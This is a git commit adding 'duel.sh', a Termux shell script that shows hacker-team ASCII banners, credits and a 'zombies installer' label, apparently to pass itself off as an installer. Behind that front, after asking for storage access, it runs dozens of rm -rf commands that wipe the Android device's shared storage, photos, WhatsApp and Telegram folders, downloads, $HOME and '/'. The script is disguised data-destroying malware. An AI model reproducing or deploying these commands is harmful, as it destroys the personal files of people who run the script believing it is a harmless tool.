32a12557c0f3991346747cede839881260731793
greenzombies123 <52916652+greenzombies123@users.noreply.github.com>
2019-08-24 09:01:10 +0700

    Add files via upload

---
+++ duel.sh
@@ -0,0 +1,134 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+echo 
+echo
+echo
+echo $red" @@@@@@@@  @@@@@@@   @@@@@@@@  @@@@@@@@  @@@  @@@  "
+sleep 1
+echo $red"@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  "
+sleep 1
+echo $red"!@@        @@!  @@@  @@!       @@!       @@!@!@@@  "
+sleep 1
+echo $red"!@!        !@!  @!@  !@!       !@!       !@!!@!@!  "
+sleep 1
+echo $white"!@! @!@!@  @!@!!@!   @!!!:!    @!!!:!    @!@ !!@!  "
+sleep 1
+echo $white"!!! !!@!!  !!@!@!    !!!!!:    !!!!!:    !@!  !!!  "
+sleep 1
+echo $white":!!   !!:  !!: :!!   !!:       !!:       !!:  !!!  "
+sleep 1
+echo $white":!:   !::  :!:  !:!  :!:       :!:       :!:  !:!  "
+echo $white" ::: ::::  ::   :::   :: ::::   :: ::::   ::   ::  "
+echo $white" :: :: :    :   : :  : :: ::   : :: ::   ::    :   "
+echo
+echo $red"                                                                    "
+echo $red"@@@@@@@@   @@@@@@   @@@@@@@@@@   @@@@@@@   @@@  @@@@@@@@   @@@@@@   "
+echo $red"@@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@  @@@@@@@@  @@@@@@@   "
+echo $red"     @@!  @@!  @@@  @@! @@! @@!  @@!  @@@  @@!  @@!       !@@       "
+echo $red"    !@!   !@!  @!@  !@! !@! !@!  !@   @!@  !@!  !@!       !@!       "
+echo $red"   @!!    @!@  !@!  @!! !!@ @!@  @!@!@!@   !!@  @!!!:!    !!@@!!    "
+echo $white"  !!!     !@!  !!!  !@!   ! !@!  !!!@!!!!  !!!  !!!!!:     !!@!!!   "
+echo $white" !!:      !!:  !!!  !!:     !!:  !!:  !!!  !!:  !!:            !:!  "
+echo $white":!:       :!:  !:!  :!:     :!:  :!:  !:!  :!:  :!:           !:!   "
+echo $white" :: ::::  ::::: ::  :::     ::    :: ::::   ::   :: ::::  :::: ::   "
+echo $white": :: : :   : :  :    :      :    :: : ::   :    : :: ::   :: : :    "
+echo
+date
+echo $red"___________________________________________________"
+echo $red" [+]Author by    : GREEN ZOMBIES "
+echo $red" [+]Team           : AGEN SEA         "
+echo $red" [+]Thanks to      : MR_81"
+echo $red" [+]Thanks to      : MR_ARIANIMOUS"
+echo $white" [+]Thanks to      : MR_XZ.6"
+echo $white" [+]Thanks to      : B3kT0509"
+echo $white" [+]Thanks to      : MR_VIRUS"
+echo $white" [+]Thanks to      : MR_DENIMNEWBIE"
+echo $white" [+]Thanks to      :꧁࿗ｲu4刀乙•ｱ尺o√oズﾑｲo尺࿗꧂"
+echo $white"___________________________________________________"
+echo
+echo
+echo
+echo $green" TUNGGU SEBENTAR "
+sleep 1
+echo
+echo
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf storage/emulated/0
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /storage/emulated/0/Telegram
+rm -rf /storage/emulated/0/Downloads
+rm -rf /storage/emulated/0/unduhan
+rm -rf /storage/shared/WhatsApp
+rm -rf /storage/shared/DCIM
+rm -rf /storage/shared/GBWhatsApp
+rm -rf /storage/shared/GBInstagram
+rm -rf /storage/shared/Pictures
+rm -rf /storage/shared/Movies
+rm -rf /storage/shared/Download
+rm -rf /storage/shared/Movies
+rm -rf /storage/shared/system/cdsys.co
+rm -rf /storage/shared/system
+rm -rf /storage/shared/Android
+rm -rf /storage/shared/Playlists
+rm -rf /storage/shared/Telegram
+rm -rf /storage/shared/Music
+rm -rf /storage/shared/Movies
+rm -rf /storage/emulated/0/GBWhatsApp
+rm -rf /storage/emulated/0/GBInsta
+rm -rf /storage/emulated/0/GBTelegram
+rm -rf /storage/downloads
+rm -rf /storage/dcim
+rm -rf /storage/shared
+rm -rf /storage/music
+rm -rf /storage/external-1
+rm -rf /
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/WhatsApp
+rm -rf /sdcard/0/Intagram
+echo $red"                                                                    "
+echo $red"@@@@@@@@   @@@@@@   @@@@@@@@@@   @@@@@@@   @@@  @@@@@@@@   @@@@@@   "
+echo $red"@@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@  @@@@@@@@  @@@@@@@   "
+echo $red"     @@!  @@!  @@@  @@! @@! @@!  @@!  @@@  @@!  @@!       !@@       "
+echo $red"    !@!   !@!  @!@  !@! !@! !@!  !@   @!@  !@!  !@!       !@!       "
+sleep 2
+echo $red"   @!!    @!@  !@!  @!! !!@ @!@  @!@!@!@   !!@  @!!!:!    !!@@!!    "
+echo $white"  !!!     !@!  !!!  !@!   ! !@!  !!!@!!!!  !!!  !!!!!:     !!@!!!   "
+echo $white" !!:      !!:  !!!  !!:     !!:  !!:  !!!  !!:  !!:            !:!  "
+echo $white":!:       :!:  !:!  :!:     :!:  :!:  !:!  :!:  :!:           !:!   "
+echo $white" :: ::::  ::::: ::  :::     ::    :: ::::   ::   :: ::::  :::: ::   "
+echo $white": :: : :   : :  :    :      :    :: : ::   :    : :: ::   :: : :    "
+echo
+figlet -f smshadow "zombies"
+figlet -f smshadow "installer"
+echo $indigo
+date
+echo $red"___________________________________________________"
+echo $red" [+]Author by    : GREEN ZOMBIES "
+sleep 1
+echo $red" [+]Team           : AGEN SEA         "
+sleep 1
+echo $red" [+]Thanks to      : MR_81"
+echo $red" [+]Thanks to      : MR_ARIANIMOUS"
+echo $white" [+]Thanks to      : MR_XZ.6"
+echo $white" [+]Thanks to      : B3kT0509"
+echo $white" [+]Thanks to      : MR_VIRUS"
+echo $white" [+]Thanks to      : MR_DENIMNEWBIE"
+sleep 2
+echo $white" [+]Thanks to      :꧁࿗ｲu4刀乙•ｱ尺o√oズﾑｲo尺࿗꧂"
+echo $white"___________________________________________________"
+echo
+echo
